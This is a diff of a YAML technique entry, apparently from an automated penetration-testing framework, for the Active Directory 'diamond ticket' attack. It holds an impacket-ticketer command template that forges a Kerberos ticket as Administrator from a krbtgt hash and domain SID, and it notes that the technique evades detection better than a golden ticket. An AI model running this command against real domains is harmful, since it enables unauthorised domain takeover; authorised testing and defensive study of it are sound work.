@@ -5,8 +5,8 @@ preconditions:
 - domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-ticketer -request -domain {domain} -user Administrator
-  -password '{password}' -nthash '{krbtgt_hash}' -domain-sid '{sid}'
+command_template: impacket-ticketer -request -domain {domain} -user Administrator -password '{password}' -nthash '{krbtgt_hash}'
+  -domain-sid '{sid}'
 parser: impacket_parser
 expected_effects:
 - diamond_ticket_forged
@@ -15,7 +15,28 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: Modifies legitimate TGT's PAC instead of forging from scratch. Harder to
-  detect than golden ticket because the TGT has valid timestamp and encryption from
-  DC.
+mechanism: Modifies legitimate TGT's PAC instead of forging from scratch. Harder to detect than golden ticket because the
+  TGT has valid timestamp and encryption from DC.
 hacktricks_ref: windows-hardening/active-directory-methodology/README.md
+references:
+  ocd_mindmap_node_ids:
+  - 00d95fb22f
+  - 0fbac96ac1
+  - 337bc19c57
+  - 42e858082c
+  - 47b34a2482
+  - 4c8a1de7c1
+  - 53b809903d
+  - 609a98cdf8
+  - 73548655eb
+  - 8f7e2cdb5f
+  - 96696bc47f
+  - b1e65277aa
+  - b2d42093e6
+  - c21b7a4047
+  - cc03abded4
+  - ccaa0064a5
+  - f0b67db65c
+  - f41470d83a
+  - f45806da29
+  - fe998000ba
